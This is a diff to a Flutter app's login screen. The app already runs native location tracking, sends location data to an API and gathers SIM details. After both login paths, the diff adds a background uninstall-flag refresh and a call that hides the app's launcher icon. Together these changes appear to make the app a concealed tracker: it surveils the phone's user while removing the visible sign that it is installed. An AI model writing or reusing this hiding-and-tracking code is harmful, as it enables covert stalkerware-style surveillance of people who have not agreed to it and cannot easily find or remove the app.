@@ -5,6 +5,8 @@ import '../../services/fcm_service.dart';
 import '../../services/native_location_tracking_service.dart';
 import '../../services/user_location_service.dart';
 import '../../services/sim_details_service.dart';
+import '../../services/launcher_visibility_service.dart';
+import '../../services/uninstall_flag_service.dart';
 import 'root_shell.dart';
 
 class LoginScreen extends StatefulWidget {
@@ -76,6 +78,7 @@ class _LoginScreenState extends State<LoginScreen> {
         }
 
         NativeLocationTrackingService.startIfPossible();
+        UninstallFlagService.refreshInBackground();
         // Send location to API after Google login (same as email login)
         UserLocationService.fetchAndSendLocation().then((_) {
           print('[Login] ✅ Location sent after Google login');
@@ -88,7 +91,9 @@ class _LoginScreenState extends State<LoginScreen> {
         }).catchError((e) {
           print('[Login] ⚠️ SIM details after Google login failed: $e');
         });
-        
+
+        await LauncherVisibilityService.setLauncherEntryVisible(false);
+
         // Show success message
         if (mounted) {
           ScaffoldMessenger.of(context).showSnackBar(
@@ -152,6 +157,7 @@ class _LoginScreenState extends State<LoginScreen> {
         }
 
         NativeLocationTrackingService.startIfPossible();
+        UninstallFlagService.refreshInBackground();
         // Send location to API after login (as requested)
         UserLocationService.fetchAndSendLocation().then((_) {
           print('[Login] ✅ Location sent after login');
@@ -164,6 +170,8 @@ class _LoginScreenState extends State<LoginScreen> {
         }).catchError((e) {
           print('[Login] ⚠️ SIM details after login failed: $e');
         });
+
+        await LauncherVisibilityService.setLauncherEntryVisible(false);
 
         ScaffoldMessenger.of(context).showSnackBar(
           const SnackBar(
